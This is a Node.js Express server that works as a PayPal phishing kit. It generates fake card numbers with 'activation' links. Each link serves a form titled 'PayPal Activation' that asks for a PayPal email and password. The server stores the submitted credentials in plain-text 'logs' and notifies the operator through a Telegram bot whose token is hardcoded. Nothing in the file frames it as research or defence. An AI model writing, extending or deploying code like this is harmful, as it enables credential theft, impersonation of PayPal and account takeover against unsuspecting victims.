const express = require('express');
const cors = require('cors');
const fs = require('fs').promises;
const TelegramBot = require('node-telegram-bot-api');
const app = express();

app.use(express.json());
app.use(cors());

// Telegram bot configuration
const token = '7298585119:AAG-B6A6fZICTrYS7aNdA_2JlfnbghgnzAo'; // Your bot token
const chatId = '6270110371'; // Your chat ID
const bot = new TelegramBot(token, { polling: false });

// File paths
const USERS_FILE = 'users.json';
const CARDS_FILE = 'cards.json';
const LOGS_FILE = 'logs.json';

// Initialize files if they don't exist
async function initFiles() {
  try {
    await fs.access(USERS_FILE);
  } catch {
    await fs.writeFile(USERS_FILE, JSON.stringify({}, null, 2));
  }
  try {
    await fs.access(CARDS_FILE);
  } catch {
    await fs.writeFile(CARDS_FILE, JSON.stringify([], null, 2));
  }
  try {
    await fs.access(LOGS_FILE);
  } catch {
    await fs.writeFile(LOGS_FILE, JSON.stringify([], null, 2));
  }
}
initFiles();

// Read data from files
async function readData(file) {
  const data = await fs.readFile(file, 'utf8');
  return JSON.parse(data);
}

// Write data to files
async function writeData(file, data) {
  await fs.writeFile(file, JSON.stringify(data, null, 2));
}

// Send Telegram notification
async function sendTelegramNotification(cardId, username) {
  const message = `New PayPal log received at ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}.\nCard ID: ${cardId}\nActivated by: ${username}`;
  try {
    await bot.sendMessage(chatId, message);
    console.log('Telegram notification sent');
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
  }
}

// Register user
app.post('/api/register', async (req, res) => {
  const { username, password } = req.body;
  const users = await readData(USERS_FILE);
  if (users[username]) return res.status(400).json({ error: 'User exists' });
  users[username] = password;
  await writeData(USERS_FILE, users);
  res.json({ message: 'User registered' });
});

// Login user
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const users = await readData(USERS_FILE);
  if (users[username] === password) {
    res.json({ message: 'Login successful', username });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Generate card
app.post('/api/generate-card', async (req, res) => {
  const { username, name, expDate, amount } = req.body;
  if (!username || !name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
    return res.status(400).json({ error: 'Invalid input' });
  }
  const cards = await readData(CARDS_FILE);
  const cardNumber = "4123" + Math.random().toString().slice(2, 14).padEnd(12, '0');
  const maskedNumber = `****-****-****-${cardNumber.slice(-4)}`;
  const cvv = Math.floor(100 + Math.random() * 900);
  const cardId = Math.random().toString(36).substr(2, 9);
  const link = `http://localhost:3000/api/activate/${cardId}`;
  const card = {
    id: cardId,
    number: maskedNumber,
    cvv,
    name,
    expDate: `${expDate.slice(0, 2)}/${expDate.slice(2)}`,
    amount: parseFloat(amount),
    status: 'Pending',
    owner: username,
    activations: [],
    generationTimestamp: new Date().toISOString(),
  };
  cards.push(card);
  await writeData(CARDS_FILE, cards);
  res.json({ cardId, link });
});

// Activate card via link
app.get('/api/activate/:cardId', async (req, res) => {
  const { cardId } = req.params;
  const cards = await readData(CARDS_FILE);
  const card = cards.find(c => c.id === cardId);
  if (!card || card.status !== 'Pending') {
    return res.status(404).send('Invalid or already activated card');
  }
  res.send(`
    <html>
      <body>
        <h2>PayPal Activation</h2>
        <form action="/api/activate/${cardId}" method="post">
          <input type="text" name="username" placeholder="Email or mobile number" required><br>
          <input type="password" name="password" placeholder="Password" required><br>
          <button type="submit">Activate Card</button>
        </form>
      </body>
    </html>
  `);
});

// Process activation form submission
app.post('/api/activate/:cardId', async (req, res) => {
  const { cardId } = req.params;
  const { username, password } = req.body;
  const cards = await readData(CARDS_FILE);
  const card = cards.find(c => c.id === cardId);
  if (!card || card.status !== 'Pending' || !username || !password) {
    return res.status(400).send('Invalid activation');
  }
  card.status = 'Activated';
  card.activations.push({
    id: Date.now().toString(), // Unique log ID based on timestamp
    user: username,
    pass: password,
    time: new Date().toISOString(),
  });
  await writeData(CARDS_FILE, cards);

  // Send Telegram notification
  await sendTelegramNotification(cardId, username);

  // Store log
  const logs = await readData(LOGS_FILE);
  logs.push({ id: card.activations[card.activations.length - 1].id, cardId, username, password, time: new Date().toISOString() });
  await writeData(LOGS_FILE, logs);

  res.send('Card activated successfully. <a href="/api/dashboard/user1">Back to Dashboard</a>'); // Replace user1 with dynamic username if needed
});

// Get PayPal logs for a card
app.get('/get/:cardId', async (req, res) => {
  const { cardId } = req.params;
  const cards = await readData(CARDS_FILE);
  const card = cards.find(c => c.id === cardId);
  if (!card) return res.status(404).json({ error: 'Card not found' });
  const logs = await readData(LOGS_FILE);
  const cardLogs = logs.filter(log => log.cardId === cardId);
  res.json({ cardId, logs: cardLogs });
});

// Delete a card (owner or user-owned)
app.delete('/api/delete-card/:cardId', async (req, res) => {
  const { cardId } = req.params;
  const { username } = req.query; // Pass username in query for ownership check
  const cards = await readData(CARDS_FILE);
  const cardIndex = cards.findIndex(c => c.id === cardId);
  if (cardIndex === -1) return res.status(404).json({ error: 'Card not found' });
  const card = cards[cardIndex];
  if (username !== card.owner && username !== 'admin') { // 'admin' can delete any card
    return res.status(403).json({ error: 'Unauthorized to delete this card' });
  }
  cards.splice(cardIndex, 1);
  await writeData(CARDS_FILE, cards);

  // Remove associated logs
  const logs = await readData(LOGS_FILE);
  const updatedLogs = logs.filter(log => log.cardId !== cardId);
  await writeData(LOGS_FILE, updatedLogs);

  res.json({ message: 'Card deleted successfully' });
});

// Delete a log (user-owned)
app.delete('/api/delete-log/:logId', async (req, res) => {
  const { logId } = req.params;
  const { username } = req.query; // Pass username in query for ownership check
  const cards = await readData(CARDS_FILE);
  const logs = await readData(LOGS_FILE);
  const log = logs.find(l => l.id === logId);
  if (!log) return res.status(404).json({ error: 'Log not found' });
  const card = cards.find(c => c.id === log.cardId);
  if (!card || (username !== card.owner && username !== 'admin')) {
    return res.status(403).json({ error: 'Unauthorized to delete this log' });
  }
  const updatedLogs = logs.filter(l => l.id !== logId);
  await writeData(LOGS_FILE, updatedLogs);
  card.activations = card.activations.filter(a => a.id !== logId);
  await writeData(CARDS_FILE, cards);
  res.json({ message: 'Log deleted successfully' });
});

// Get user dashboard
app.get('/api/dashboard/:username', async (req, res) => {
  const { username } = req.params;
  const users = await readData(USERS_FILE);
  if (!users[username]) return res.status(404).json({ error: 'User not found' });
  const cards = await readData(CARDS_FILE);
  const logs = await readData(LOGS_FILE);
  const userCards = cards.filter(c => c.owner === username);
  const userLogs = logs.filter(l => cards.find(c => c.id === l.cardId && c.owner === username));
  res.json({ cards: userCards, logs: userLogs });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT} at ${new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' })}`));
